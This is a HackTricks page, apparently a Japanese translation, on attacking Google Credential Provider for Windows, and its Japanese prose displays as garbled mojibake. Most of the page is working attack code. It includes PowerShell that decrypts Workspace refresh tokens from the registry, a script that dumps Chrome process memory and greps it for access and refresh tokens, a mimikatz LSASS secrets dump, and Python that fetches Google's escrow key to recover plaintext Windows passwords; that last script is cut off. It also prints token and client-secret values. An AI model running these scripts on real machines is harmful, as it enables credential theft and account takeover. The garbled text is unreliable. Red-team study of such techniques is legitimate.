# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

ã“ã‚Œã¯ã€Google WorkspaceãŒæä¾›ã™ã‚‹ã‚·ãƒ³ã‚°ãƒ«ã‚µã‚¤ãƒ³ã‚ªãƒ³ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**Workspaceã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦Windows PCã«ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã•ã‚‰ã«ã€ã“ã‚Œã«ã‚ˆã‚ŠPCã®ã„ãã¤ã‹ã®å ´æ‰€ã«Google Workspaceã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒä¿å­˜ã•ã‚Œã¾ã™ã€‚

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ã¯**GCPW**ã‚’æ¤œå‡ºã—ã€æ§‹æˆã«é–¢ã™ã‚‹æƒ…å ±ã‚„**ãƒˆãƒ¼ã‚¯ãƒ³**ã•ãˆå–å¾—ã§ãã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### GCPW - MitM

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒGCPWã‚’ä»‹ã—ã¦Google Workspaceã¨åŒæœŸã•ã‚ŒãŸWindows PCã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä¸€èˆ¬çš„ãªãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã‚’å®Œäº†ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã¯ã€PCãŒãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¨äº¤æ›ã™ã‚‹OAuthã‚³ãƒ¼ãƒ‰ã‚’è¿”ã—ã¾ã™ã€‚ 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

æ–°ã—ã„è¡ŒãŒè¿½åŠ ã•ã‚Œã¦ã€ã‚ˆã‚Šèª­ã¿ã‚„ã™ããªã£ã¦ã„ã¾ã™ã€‚

{% hint style="info" %}
`Proxifier`ã‚’PCã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€`utilman.exe`ãƒã‚¤ãƒŠãƒªã‚’`cmd.exe`ã§ä¸Šæ›¸ãã—ã€Windowsãƒ­ã‚°ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ã§**ã‚¢ã‚¯ã‚»ã‚·ãƒ“ãƒªãƒ†ã‚£æ©Ÿèƒ½**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§MitMã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Š**CMD**ãŒå®Ÿè¡Œã•ã‚Œã€**Proxifierã‚’èµ·å‹•ã—ã¦è¨­å®šã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚\
`Proxifier`ã§QUICK UDPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’**ãƒ–ãƒ­ãƒƒã‚¯**ã™ã‚‹ã“ã¨ã‚’å¿˜ã‚Œãªã„ã§ãã ã•ã„ã€‚ãã†ã™ã‚‹ã“ã¨ã§TCPé€šä¿¡ã«ãƒ€ã‚¦ãƒ³ã‚°ãƒ¬ãƒ¼ãƒ‰ã•ã‚Œã€è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€ã€Œã‚µãƒ¼ãƒ“ã‚¹ãŠã‚ˆã³ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã§ä¸¡æ–¹ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’è¨­å®šã—ã€Windowsã«Burp CAè¨¼æ˜æ›¸ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

ã•ã‚‰ã«ã€**`HKLM:\SOFTWARE\Google\GCPW`**ã«`enable_verbose_logging = 1`ã¨`log_file_path = C:\Public\gcpw.log`ã®ã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ã„ãã¤ã‹ã®ãƒ­ã‚°ã‚’ä¿å­˜ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### GCPW - ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒˆ

GCPWãŒãƒ‡ãƒã‚¤ã‚¹ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã¯ã€ä»¥ä¸‹ã®ãƒ—ãƒ­ã‚»ã‚¹ãŒå­˜åœ¨ã™ã‚‹ã‹ã€ã¾ãŸã¯ä»¥ä¸‹ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ãŒå­˜åœ¨ã™ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ç¢ºèªã§ãã¾ã™ï¼š
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`** ã§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæœ€è¿‘ãƒ­ã‚°ã‚¤ãƒ³ã—ãŸå ´åˆã®æš—å·åŒ–ã•ã‚ŒãŸ **refresh token** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** ã§ã¯ã€ã‚­ãƒ¼ `domains_allowed` ã«ãƒ­ã‚°ã‚¤ãƒ³ã‚’è¨±å¯ã•ã‚ŒãŸ **domains** ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€ã‚µãƒ–ã‚­ãƒ¼ã«ã¯ãƒ¡ãƒ¼ãƒ«ã€å†™çœŸã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãƒˆãƒ¼ã‚¯ãƒ³ã®æœ‰åŠ¹æœŸé™ã€ãƒˆãƒ¼ã‚¯ãƒ³ãƒãƒ³ãƒ‰ãƒ«ãªã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

{% hint style="info" %}
ãƒˆãƒ¼ã‚¯ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã¯ `eth.` ã§å§‹ã¾ã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã§ã€æ¬¡ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã„ãã¤ã‹ã®æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

ã¾ãŸã€æ¬¡ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒˆãƒ¼ã‚¯ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

ç§ã®çŸ¥ã‚‹é™ã‚Šã€ãƒˆãƒ¼ã‚¯ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‹ã‚‰ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚„ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ã¯ä¸å¯èƒ½ã§ã™ã€‚
{% endhint %}

ã•ã‚‰ã«ã€ãƒ•ã‚¡ã‚¤ãƒ« **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** ã¯ã€`enableDmEnrollment`ã€`enableGcpAutoUpdate`ã€`enableMultiUserLogin`ï¼ˆè¤‡æ•°ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒWorkspaceã«ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‹ã©ã†ã‹ï¼‰ã‚„ã€`validityPeriodDays`ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒGoogleã«ç›´æ¥å†èªè¨¼ã™ã‚‹å¿…è¦ãŒãªã„æ—¥æ•°ï¼‰ãªã©ã®ç•°ãªã‚‹**è¨­å®š**ã®æƒ…å ±ã‚’å«ã‚€jsonã§ã™ã€‚

### GCPW - ãƒ¬ã‚¸ã‚¹ãƒˆãƒªãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³

ãƒ¬ã‚¸ã‚¹ãƒˆãƒª **`HKCU:\SOFTWARE\Google\Accounts`** å†…ã«ã€**`refresh_token`** ãŒæš—å·åŒ–ã•ã‚Œã¦ã„ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãƒ¡ã‚½ãƒƒãƒ‰ **`ProtectedData.Unprotect`** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ç°¡å˜ã«å¾©å·åŒ–ã§ãã¾ã™ã€‚

<details>

<summary><strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> ã®ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã—ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å¾©å·åŒ–ã™ã‚‹</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

ä¾‹:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**ã“ã®ãƒ“ãƒ‡ã‚ª**](https://www.youtube.com/watch?v=FEQxHRRP\_5I)ã§èª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã€**`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`**ã‹ã‚‰å€¤ã‚’å¤‰æ›´ï¼ˆã¾ãŸã¯å‰Šé™¤ï¼‰ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€æ¬¡å›ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨å†åº¦ãƒ­ã‚°ã‚¤ãƒ³ãŒå¿…è¦ã«ãªã‚Šã€**ãƒˆãƒ¼ã‚¯ãƒ³ã¯ä»¥å‰ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã¾ã™**ã€‚

### GCPW - ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³

ãƒ•ã‚¡ã‚¤ãƒ«**`%LocalAppData%\Google\Chrome\User Data\Local State`**ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**Google Chromeãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«**å†…ã«ã‚ã‚‹**`refresh_tokens`**ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã®ã‚­ãƒ¼ã‚’ä¿å­˜ã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼š

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

ã“ã‚Œã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**C#ã‚³ãƒ¼ãƒ‰**ã¯ã€[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ã§å¾©å·åŒ–ã•ã‚ŒãŸå½¢ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã•ã‚‰ã«ã€æš—å·åŒ–ã¯ã“ã®ã‚³ãƒ¼ãƒ‰ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š[https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCMãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒè¦³å¯Ÿã§ãã€æš—å·åŒ–ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã¯**ãƒãƒ¼ã‚¸ãƒ§ãƒ³**ï¼ˆã“ã®æ™‚ç‚¹ã§ã¯**`v10`**ï¼‰ã§å§‹ã¾ã‚Šã€æ¬¡ã«[**12Bã®ãƒãƒ³ã‚¹**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42)ãŒã‚ã‚Šã€æœ€å¾Œã«**ã‚µã‚¤ãƒ•ã‚¡ãƒ¼ãƒ†ã‚­ã‚¹ãƒˆ**ã¨**16Bã®MAC**ãŒã‚ã‚Šã¾ã™ã€‚

### GCPW - ãƒ—ãƒ­ã‚»ã‚¹ãƒ¡ãƒ¢ãƒªã‹ã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ãƒ€ãƒ³ãƒ—

ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`procdump`ã‚’ä½¿ç”¨ã—ã¦ã™ã¹ã¦ã®**Chrome**ãƒ—ãƒ­ã‚»ã‚¹ã‚’**ãƒ€ãƒ³ãƒ—**ã—ã€**æ–‡å­—åˆ—**ã‚’æŠ½å‡ºã—ã€**ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³**ãŠã‚ˆã³**ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³**ã«é–¢é€£ã™ã‚‹æ–‡å­—åˆ—ã‚’**æ¤œç´¢**ã§ãã¾ã™ã€‚ChromeãŒã„ãã¤ã‹ã®Googleã‚µã‚¤ãƒˆã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã„ãã¤ã‹ã®**ãƒ—ãƒ­ã‚»ã‚¹ãŒãƒ¡ãƒ¢ãƒªã«ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãŠã‚ˆã³/ã¾ãŸã¯ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä¿å­˜ã—ã¦ã„ã¾ã™ï¼**

<details>

<summary>Chromeãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒ€ãƒ³ãƒ—ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œç´¢</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

`gcpw_extension.exe`ã‚’ä½¿ã£ã¦åŒã˜ã“ã¨ã‚’è©¦ã¿ã¾ã—ãŸãŒã€ãƒˆãƒ¼ã‚¯ãƒ³ã¯è¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã§ã—ãŸã€‚

ä½•ã‚‰ã‹ã®ç†ç”±ã§ã€**æŠ½å‡ºã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ ãƒˆãƒ¼ã‚¯ãƒ³ã®ã„ãã¤ã‹ã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã™ï¼ˆãŸã ã—ã€ã„ãã¤ã‹ã¯æœ‰åŠ¹ã§ã™ï¼‰**ã€‚ãƒ€ãƒ³ãƒ—ã‹ã‚‰æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€æ–‡å­—ã‚’1ã¤ãšã¤å‰Šé™¤ã™ã‚‹ä»¥ä¸‹ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’è©¦ã—ã¾ã—ãŸã€‚ã“ã‚Œã§æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã§ã—ãŸãŒã€ã‚‚ã—ã‹ã—ãŸã‚‰å½¹ç«‹ã¤ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

<details>

<summary>æ–‡å­—ã‚’1ã¤ãšã¤å‰Šé™¤ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç¢ºèªã™ã‚‹</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å›å¾©

GCPWã‚’æ‚ªç”¨ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å¹³æ–‡ã‚’å›å¾©ã™ã‚‹ã«ã¯ã€**mimikatz**ã‚’ä½¿ç”¨ã—ã¦**LSASS**ã‹ã‚‰æš—å·åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
æ¬¡ã«ã€ç”»åƒã®ã‚ˆã†ã« `Chrome-GCPW-<sid>` ã®ã‚ˆã†ãªç§˜å¯†ã‚’æ¤œç´¢ã—ã¾ã™ï¼š

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

æ¬¡ã«ã€ã‚¹ã‚³ãƒ¼ãƒ— `https://www.google.com/accounts/OAuthLogin` ã‚’æŒã¤ **ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³** ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¾©å·åŒ–ã™ã‚‹ãŸã‚ã®ç§˜å¯†éµã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

<details>

<summary>ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã€æš—å·åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€ãŠã‚ˆã³ãƒªã‚½ãƒ¼ã‚¹IDã‚’æŒ‡å®šã—ã¦å¹³æ–‡ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
